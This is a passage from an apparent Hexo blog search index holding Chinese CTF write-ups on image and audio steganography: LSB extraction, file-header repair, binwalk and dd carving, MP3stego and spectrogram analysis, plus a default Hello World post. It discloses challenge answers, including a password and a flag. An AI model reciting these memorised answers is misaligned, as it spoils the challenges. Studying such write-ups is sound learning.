LSB隐写&nbsp;&nbsp;这个题学到很多知识。简述一下，先看到提示，最低最低位，最开始跑偏了，想成了图片缺失，在最低位出现flag，后来改了像素，变成了另外一张图片，（当时的启发由于这个网站：http://www.jianshu.com/p/02fdd5edd9fc） 后来出现的图片出现了类似像素的东西，就很丑，，然后也不会了，再看一下，是一个png图片，考虑扔进stegsolve看一下，最低位， 隐约间看到了key:paaaasword LSB &nbsp;&nbsp;哎呦喂，以为出来了，看到hint，秘密之所以是秘密，因为秘密需要秘密去探寻，就考虑里面怕是有txt，LSB隐写，喜极而泣的在kali里面搞啊搞（搞的方法是：使用一个github上一个工具来处理-cloacked-pixel(具体用法见https://github.com/cyberinc/cloacked-pixel)。 &nbsp;&nbsp;我在kali下进行测试的。先将文件解压，并将png文件放进去，在命令行下进入到该文件夹。），密码试了7次（可能不止，还有自己输错的），最后密码是 ： paaaasword大概是在kali里面这样的情况： &nbsp;&nbsp;然后使用命令python lsb.py extract misc2.png 111.txt paaaassword可以得到隐写的文件111.txt。 ps:extract指的是提取misc2.png指的是导入文件名111.txt指的是导出文件名paaaasword指的是密码（此处根据提示猜测） &nbsp;&nbsp;当然，我天真的以为，txt里面就是我心心念念的flag，打开，试了的所有txt都是乱码， 图片修复我猜里面还有一个图片，winhex打开，看一下文件头， &nbsp;&nbsp;啧，和这个png很像嘛，百度一下文件头，http://www.jianshu.com/p/02fdd5edd9fc文件怕是损坏了，修复出来，编辑——粘贴字节8， 改后缀，png，看到曙光了，是个二维码， &nbsp;&nbsp;哇，兴奋的搓手手，赶紧在线解密， ，啥，识别不出来，用手机，还是识别不出来，哇，对比一下正常的二维码，定位点呢，定位点不对啊。搞到ps里面，emmm，截图成四块，第四块好像有一个反向，再拼起来，扫一下，终于对了。 做出来之后的我 本来还想打爆出题人，但是现在已经没有力气了。不过真的学到很多，嘻嘻嘻~]]></content>
      <categories>
        <category>CTF-Misc</category>
      </categories>
      <tags>
        <tag>CTF-Misc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[图片隐写术总结]]></title>
    <url>%2F2017%2F08%2F21%2F1%2F</url>
    <content type="text"><![CDATA[大鹏一日同风起，扶摇直上九万里一直比较喜欢做杂项（虽然还是很垃圾），就感觉很有意思。总结了一些关于图片隐写的姿势，一起学习~ 1.另存为图片 （还有直接看文件信息，可能就在文件信息里面） 2.改后缀 zip / rar /txt3.扔winhex 这里要看文件头和文件结束的位置 Jpg文件头：FFD8FF，结尾都是FF D9 gif的开头是GIF8（47494638） PNG (png)，文件头：89504E47 ZIP Archive (zip)，文件头：504B0304 RAR Archive (rar)，文件头：52617221 …… 这是一些文件头标志的网站：http://www.cnblogs.com/mq0036/p/3912355.html 4.修复文件 5.分离图片：扔binwalk #binwalk 2.jpg 找到偏移位置 #dd if=2.jpg of=1.jpg skip=偏移位置 bs=1 if是指定输入文件，of是指定输出文件， skip是指定从输入文件开头跳过XXX(140147)个块后再开始复制， bs设置每次读写块的大小为1字节 。 还可以使用foremost 分离命令： #foremost 2.jpg 他会分离之后自己储存到一个ouput的文件夹，里面就有出现的分离图片 6.谷歌识图，百度识图 7.png图片 ①可能还会有图片要拉长一些 ②看低位（stegsolve） 8.base 64 转化成为图片 http://www.tuicool.com/articles/VviyAfY CTF图片隐写术http://www.jianshu.com/p/02fdd5edd9fc CTF隐写总结 （有png相关题目）]]></content>
      <categories>
        <category>CTF-Misc</category>
      </categories>
      <tags>
        <tag>CTF-Misc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[音频隐写 MP3stego+wav隐写+题目]]></title>
    <url>%2F2017%2F08%2F20%2F%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99-MP3stego-wav%E9%9A%90%E5%86%99-%E9%A2%98%E7%9B%AE%2F</url>
    <content type="text"><![CDATA[所谓高贵的灵魂，即对自己怀有敬畏之心摘要： 音频隐写，遇见的比较少，这里总结一下我遇见过的一些关于音频隐写的题目，以后遇见其他类型的，再进行补充。 这是最简单的那种&nbsp; 当年年少无知，也不知道很多厉害的姿势，就直接把歌曲输入了网易云，把歌手或者专辑找出来了，然后直接提交flag MP3stego1.知识储备关于MP3stego用法：http://blog.csdn.net/sinat_38134380/article/details/69789665 2.题目分析 1）下载MP3stego 2）将需要分析的mp3文件拖到Decode.exe所在的目录，如 下面的sycgeek-mp3.mp3 3） 开始运行cmd，进入有mp3stego的磁盘 4）-X是获取隐藏的东西 -P后面写密码 5）会在该目录下生成一个新的txt文档sycgeek-mp3.mp3.txt，打开 wav隐写1.知识储备wav隐写-Audacity–silenteye1）-打开wav文件，Audacity-效果-反向-播放2）-Audacity-文件名-频谱图3）-声道里面夹杂着莫斯密码，短的代表’.’,长的代表’-’4）-Audacity-频谱图-attach-点击频谱-然后点击修改spectrogram setting，把8000改为480005）-电话音分析（http://dialabc.com/sound/detect/） 2.相关资源这里再贴上两个有关的wav题目隐写的做法：http://www.sohu.com/a/116298237_468673http://www.hackdig.com/08/hack-38263.htm 3.题目分析下面写一个我自己遇见的关于wav题目的隐写姿势 链接: https://pan.baidu.com/s/1eS7s8iY密码: 53dv 分析此题：首先把这个题扔到Audacity里面，因为很容易就能听出来他有问题，就考虑看一下频谱图（当然还可以看音频轨道、效果、高音、音频波形），考虑是不是数字隐藏。这个题，把中间的灰色的放大放大，放大 emmm ，经过百度，这里有很多种加密，除了上面列举的根据波形图的0 1 加密，摩斯电码加密，我自己在做这个题的时候，还考虑了粗细会不会是表示0 1，还有条形码，经过放大，然后画下来，笔头是个好东西，这是个密码呀~，嘻嘻嘻，很简单了吧，猪圈密码。最后还要考虑一下密码的大小写哦~ 真是个磨人的小妖精~ Flag: D0g3{ahhhhhhhhh}]]></content>
      <categories>
        <category>CTF-Misc</category>
      </categories>
      <tags>
        <tag>CTF-Misc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2017%2F08%2F18%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
</search>
